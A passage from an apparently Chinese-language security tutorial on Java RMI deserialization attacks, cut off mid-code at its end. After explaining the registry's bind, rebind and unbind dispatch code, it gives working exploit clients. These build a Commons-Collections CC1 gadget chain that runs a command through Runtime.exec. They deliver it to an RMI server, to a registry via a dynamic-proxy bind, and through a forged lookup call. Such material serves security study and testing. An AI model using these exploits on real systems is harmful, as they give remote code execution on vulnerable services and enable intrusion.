<p>如果在服务端安装了存在反序列化漏洞的相关组件，那么我们就有机会利用</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="rebind"><a href="#rebind" class="headerlink" title="rebind"></a>rebind</h3><p>与<strong>bind</strong>方法类似</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="unbind"><a href="#unbind" class="headerlink" title="unbind"></a>unbind</h3><p>与<strong>lookup</strong>方法类似</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var6.unbind(var7);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>存在的攻击方式有一下三种</p>
<ul>
<li>客户端打注册中心</li>
<li>客户端打服务端</li>
<li>服务端打客户端</li>
</ul>
<h1 id="0x02-攻击利用"><a href="#0x02-攻击利用" class="headerlink" title="0x02 攻击利用"></a>0x02 攻击利用</h1><h2 id="攻击Server端"><a href="#攻击Server端" class="headerlink" title="攻击Server端"></a>攻击Server端</h2><p>首先，<strong>Client</strong>会去获取<strong>Server</strong>端创建的<strong>Stub</strong>，然后在本地调用这个<strong>Stub</strong>并传递参数</p>
<p>然后<strong>Stub</strong>会序列化这个参数再传递给<strong>Server</strong>端，<strong>Server</strong>端会反序列化这个参数再调用</p>
<p>如果此时的<strong>Client</strong>传递的参数是个<strong>Object</strong>类型的恶意对象参数</p>
<p>而且此时的<strong>Server</strong>存在有漏洞的组件，那么就有可能会造成反序列化漏洞</p>
<p><strong>利用条件</strong></p>
<ul>
<li><strong>Server端</strong>存在接收<strong>Object</strong>对象的远程对象方法</li>
<li><strong>Server端</strong>存在有反序列化漏洞的组件</li>
</ul>
<p><strong>服务端</strong></p>
<ul>
<li><h3 id="ICalc接口"><a href="#ICalc接口" class="headerlink" title="ICalc接口"></a><strong>ICalc</strong>接口</h3></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//带有Object类参数的远程对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">ICalc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h3 id="ICalcImpl实现"><a href="#ICalcImpl实现" class="headerlink" title="ICalcImpl实现"></a><strong>ICalcImpl</strong>实现</h3></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ICalcImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ICalcImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ICalc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h3 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a><strong>RMIServer</strong></h3></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ICalcImpl</span> <span class="variable">iCalc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ICalcImpl</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>,iCalc);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>客户端</strong></p>
<ul>
<li><h3 id="ICalc接口-1"><a href="#ICalc接口-1" class="headerlink" title="ICalc接口"></a><strong>ICalc</strong>接口</h3></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//带有Object类参数的远程对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">ICalc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h3 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a><strong>RMIClient</strong></h3></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">iCalc</span> <span class="operator">=</span> (ICalc) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>);</span><br><span class="line">        iCalc.ICalc(Exploit());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//恶意对象CC1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Retention.class, transformedMp);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>运行结果</strong></p>
<p>成功弹出计算器</p>
<ul>
<li><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a><strong>Server</strong></h3></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//结果输出</span></span><br><span class="line">Registry运行中......</span><br><span class="line">success</span><br></pre></td></tr></table></figure></div>

<h2 id="攻击registry端"><a href="#攻击registry端" class="headerlink" title="攻击registry端"></a>攻击registry端</h2><p>其实攻击的还是与<strong>Registry</strong>交互的几种方式</p>
<h3 id="调用bind-rebind攻击"><a href="#调用bind-rebind攻击" class="headerlink" title="调用bind&#x2F;rebind攻击"></a>调用bind&#x2F;rebind攻击</h3><p>由前面我们可以知道，当调用<strong>bind&#x2F;rebind</strong>时，会调用<strong>readObject</strong>读出参数名和远程对象，所以就有机会可以利用</p>
<p>不过由于只能接收<strong>String</strong>和<strong>Remote</strong>类型，而我们生成的恶意类是<strong>Object</strong>类型的</p>
<p>所以我们需要使用动态代理将<strong>Object</strong>强转为<strong>Remote</strong>类型的参数</p>
<p>这里需要用到**Remote.class.cast()**这个方法，主要用于将一个对象强制转换为指定类或接口的类型</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">cast</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp; !isInstance(obj))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>(cannotCastMsg(obj));</span><br><span class="line">    <span class="keyword">return</span> (T) obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h3 id="Server端不变"><a href="#Server端不变" class="headerlink" title="Server端不变"></a><strong>Server</strong>端不变</h3></li>
<li><h3 id="Client端"><a href="#Client端" class="headerlink" title="Client端"></a><strong>Client</strong>端</h3></li>
</ul>
<p><strong>RMIClient</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, (Remote) Exploit());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//恶意对象CC1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用动态代理，将其转为Remote对象</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Retention.class, transformedMp);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">RemoteProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, o);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">cast</span> <span class="operator">=</span> Remote.class.cast(RemoteProxy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMI_Client</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调用lookup-unbind攻击"><a href="#调用lookup-unbind攻击" class="headerlink" title="调用lookup&#x2F;unbind攻击"></a>调用lookup&#x2F;unbind攻击</h3><p>和<strong>bind&#x2F;rebind</strong>不同的是，<strong>lookup&#x2F;unbind</strong>只能接收<strong>String</strong>类型的参数</p>
<p>所以我们只能通过重写代码伪造连接请求，使其可以传入对象</p>
<p>以<strong>lookup</strong>为例</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line">        Remote var23;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">            var23 = (Remote)var6.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h3 id="Server不变"><a href="#Server不变" class="headerlink" title="Server不变"></a><strong>Server</strong>不变</h3></li>
<li><h3 id="Client端-1"><a href="#Client端-1" class="headerlink" title="Client端"></a><strong>Client</strong>端</h3></li>
</ul>
<p>伪造<strong>lookup</strong>方法，模拟通信过程，并传入恶意信息</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取Registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取ref</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">refDeclareFiled</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refDeclareFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) refDeclareFiled.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">operationsDeclaredField</span> <span class="operator">=</span> registry.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        operationsDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) operationsDeclaredField.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//伪造lookup代码，伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(Exploit());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> 